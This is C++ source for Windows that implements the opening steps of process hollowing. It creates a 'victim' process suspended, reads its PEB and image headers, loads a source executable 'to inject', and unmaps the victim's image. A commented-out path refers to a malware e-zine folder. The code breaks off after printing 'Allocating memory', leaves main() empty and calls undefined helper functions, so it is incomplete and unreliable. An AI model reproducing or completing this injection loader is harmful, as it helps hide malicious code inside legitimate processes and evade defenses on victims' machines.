#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <libloaderapi.h>
#include <dbghelp.h>

#define BUFFER_SIZE 0x2000  

typedef NTSTATUS(__stdcall* _NtQueryInformationProcess)(_In_ HANDLE, _In_ unsigned int, _Out_ PVOID, _In_ ULONG, _Out_ PULONG);

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)( HANDLE ProcessHandle, PVOID BaseAddress);

typedef void (*PPEBLOCKROUTINE)(
    PVOID PebLock
    );

typedef struct _PEB_FREE_BLOCK {
    _PEB_FREE_BLOCK* Next;
    ULONG                   Size;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct _PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBaseAddress;
    PPEB_LDR_DATA           LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PPEBLOCKROUTINE         FastPebLockRoutine;
    PPEBLOCKROUTINE         FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PVOID* KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PPEB_FREE_BLOCK         FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PVOID** ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} PEB, * PPEB;

PPEB FindRemotePEB(HANDLE hProcess)
{
    //Load ntdll in main process space to access to NtQueryInformationProcess
    HMODULE hNtdll = LoadLibraryA("ntdll");

    FARPROC fpNtQueryInformationProcess = GetProcAddress
    (
        hNtdll,
        "NtQueryInformationProcess"
    );

    _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;


    PROCESS_BASIC_INFORMATION* pBasicInfo = new PROCESS_BASIC_INFORMATION();

    DWORD dwReturnLength = 0;

    ntQueryInformationProcess(hProcess, 0,pBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);

    return pBasicInfo->PebBaseAddress;
}

PEB* ReadRemotePEB(HANDLE hProcess)
{
    PPEB dwPEBAdress = FindRemotePEB(hProcess);

    PEB* pPEB = new PEB();

    BOOL bSucess = ReadProcessMemory
    (
        hProcess,
        (LPCVOID)dwPEBAdress,
        pPEB,
        sizeof(PEB),
        0
    );

    return pPEB;
}

PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
{
    BYTE* lpBuffer = new BYTE[BUFFER_SIZE];

    BOOL bSuccess = ReadProcessMemory
    (
        hProcess,
        lpImageBaseAddress,
        lpBuffer,
        BUFFER_SIZE,
        0
    );

    if (!bSuccess)
        return 0;

    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;

    PLOADED_IMAGE pImage = new LOADED_IMAGE();

    pImage->FileHeader =
        (PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);

    pImage->NumberOfSections =
        pImage->FileHeader->FileHeader.NumberOfSections;

    pImage->Sections =
        (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew +
            sizeof(IMAGE_NT_HEADERS32));

    return pImage;
}

void CreateVictimProcess(char* pDestCmdLine, char* pSourceFile)
{
    LPSTARTUPINFOA  pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION  pProcessInfo = new PROCESS_INFORMATION();
    //LPCSTR processPath = "C:\\Users\\Who\\Desktop\\Books\\Malware\\E-zines\\Gedzac\\Gedzac.Mitosis.Ezine.3\\Gedzac.Mitosis.Ezine.3\\Mitosis3.exe";

    BOOL bCreateProcess = CreateProcessA(
        0,
        pDestCmdLine,
        0,
        0,
        0,
        CREATE_SUSPENDED,
        0,
        0,
        pStartupInfo,
        pProcessInfo
    );

    if (bCreateProcess)
    {
        printf("Process Created");
    }
    else
    {
        printf("Error creating process");

        return;
    }

    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);

    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

    //File where our code to inject resides

    HANDLE hSourceFile = CreateFileA(pSourceFile, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
    if (hSourceFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening %s\r\n", pSourceFile);
        return;
    }

    DWORD dwSize = GetFileSize(hSourceFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesToRead = 0;
    ReadFile(hSourceFile, pBuffer, dwSize, &dwBytesToRead, 0);

    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

    printf("Unmapping destination section\r\n");

    HMODULE hNTDLL = GetModuleHandleA("ntdll");

    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

    DWORD dwResult = NtUnmapViewOfSection
    (
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress
    );

    if (dwResult)
    {
        printf("Error unmapping section\r\n");
        return;
    }

    printf("Allocating memory\r\n");
}

int main()
{

}

